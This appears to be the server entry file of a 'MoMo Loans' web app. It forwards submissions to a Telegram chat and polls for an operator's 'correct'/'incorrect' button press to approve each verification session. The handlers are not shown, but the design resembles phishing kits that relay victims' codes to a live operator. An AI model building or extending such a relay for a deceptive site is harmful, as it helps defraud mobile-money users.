import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';
import {
  getTelegramCredentials,
  answerTelegramCallback,
  editTelegramMessageVerdict,
  verificationSessionStore,
  disableTelegramWebhook,
  checkBotTokenValidity,
} from './api/_telegram';

import sendToTelegramHandler from './api/sendToTelegram';
import sendForVerificationHandler from './api/sendForVerification';
import checkVerificationHandler from './api/checkVerification';
import telegramWebhookHandler from './api/telegram-webhook';
import telegramManageHandler from './api/telegram-manage';
import healthHandler from './api/health';

dotenv.config();

// Determine if running in production bundle
const isProduction =
  process.env.NODE_ENV === 'production' ||
  (typeof __filename !== 'undefined' && __filename.endsWith('.cjs'));

// Background Telegram Poller for instant callback resolution in persistent servers
let lastUpdateOffset = 0;
let isPollingActive = false;

async function startTelegramPoller() {
  if (isPollingActive) return;
  isPollingActive = true;

  while (isPollingActive) {
    const { botToken, chatId } = getTelegramCredentials();
    if (!botToken || botToken.includes('EXAMPLE')) {
      await new Promise((r) => setTimeout(r, 4000));
      continue;
    }

    const isValid = await checkBotTokenValidity(botToken);
    if (!isValid) {
      // Pause polling if token is 401 Unauthorized or invalid to avoid log spam
      await new Promise((r) => setTimeout(r, 30000));
      continue;
    }

    try {
      const url = `https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateOffset}&timeout=15&allowed_updates=${encodeURIComponent(
        '["callback_query","message"]'
      )}`;
      const res = await fetch(url);

      if (res.status === 409) {
        // If 409 conflict with webhook, remove webhook once and sleep
        await disableTelegramWebhook(botToken);
        await new Promise((r) => setTimeout(r, 3000));
        continue;
      }

      if (res.ok) {
        const data = (await res.json()) as {
          ok: boolean;
          result?: Array<{
            update_id: number;
            callback_query?: {
              id: string;
              from?: { first_name?: string; username?: string };
              data?: string;
              message?: { message_id: number; text?: string; chat?: { id: number } };
            };
          }>;
        };

        if (data.ok && Array.isArray(data.result)) {
          for (const update of data.result) {
            lastUpdateOffset = Math.max(lastUpdateOffset, update.update_id + 1);

            if (update.callback_query && update.callback_query.data) {
              const cbData = update.callback_query.data;
              const isCorrect = cbData.startsWith('correct_');
              const isIncorrect = cbData.startsWith('incorrect_');

              if (isCorrect || isIncorrect) {
                const sessionId = cbData.replace(/^(correct_|incorrect_)/, '');
                const finalStatus = isCorrect ? 'correct' : 'incorrect';

                const existingSession = verificationSessionStore.get(sessionId);
                if (existingSession) {
                  existingSession.status = finalStatus;
                  existingSession.updatedAt = Date.now();
                } else {
                  verificationSessionStore.set(sessionId, {
                    status: finalStatus,
                    updatedAt: Date.now(),
                  });
                }

                // Answer Telegram callback toast
                await answerTelegramCallback(
                  botToken,
                  update.callback_query.id,
                  isCorrect ? 'Verified: Approved ✅' : 'Verified: Rejected ❌'
                );

                // Update Telegram message buttons to show final verdict
                if (update.callback_query.message) {
                  const originalText = update.callback_query.message.text || '';
                  const msgChatId = update.callback_query.message.chat?.id || chatId;
                  const messageId = update.callback_query.message.message_id;

                  await editTelegramMessageVerdict(botToken, msgChatId, messageId, originalText, isCorrect);
                }
              }
            }
          }
        }
      }
    } catch {
      await new Promise((r) => setTimeout(r, 3000));
    }

    await new Promise((r) => setTimeout(r, 1000));
  }
}

async function startServer() {
  const app = express();
  app.use(express.json());

  // Register all shared API handlers identically to Vercel Serverless
  app.all('/api/sendToTelegram', (req, res) => sendToTelegramHandler(req, res));
  app.all('/api/sendForVerification', (req, res) => sendForVerificationHandler(req, res));
  app.all('/api/checkVerification', (req, res) => checkVerificationHandler(req, res));
  app.all('/api/telegram-webhook', (req, res) => telegramWebhookHandler(req, res));
  app.all('/api/telegram-manage', (req, res) => telegramManageHandler(req, res));
  app.all('/api/health', (req, res) => healthHandler(req, res));

  // Start background Telegram poller for development and persistent server runs
  startTelegramPoller().catch((err) => console.warn('Poller notice:', err.message || err));

  // Static files or Vite middleware
  if (!isProduction) {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: {
        middlewareMode: true,
        hmr: false,
      },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  let port = 3000;
  let host = '0.0.0.0';

  const portIdx = process.argv.indexOf('--port');
  if (portIdx !== -1 && process.argv[portIdx + 1]) {
    port = Number(process.argv[portIdx + 1]) || 3000;
  } else if (process.env.PORT) {
    port = Number(process.env.PORT) || 3000;
  }

  const hostIdx = process.argv.indexOf('--host');
  if (hostIdx !== -1 && process.argv[hostIdx + 1]) {
    host = process.argv[hostIdx + 1];
  }

  const server = app.listen(port, host, () => {
    console.log(`MoMo Loans server running on http://${host}:${port} (${isProduction ? 'production' : 'development'})`);
  });

  server.on('error', (err: any) => {
    if (err.code === 'EADDRINUSE') {
      console.error(`[Server] Port ${port} is already in use.`);
    } else {
      console.error('[Server] Fatal server error:', err);
    }
  });

  const shutdown = () => {
    isPollingActive = false;
    server.close();
  };

  process.on('SIGTERM', shutdown);
  process.on('SIGINT', shutdown);
}

process.on('uncaughtException', (err) => {
  console.error('[Process] Uncaught exception:', err);
});

process.on('unhandledRejection', (reason) => {
  console.error('[Process] Unhandled rejection:', reason);
});

startServer().catch((err) => {
  console.error('[Server] Failed to initialize server:', err);
});
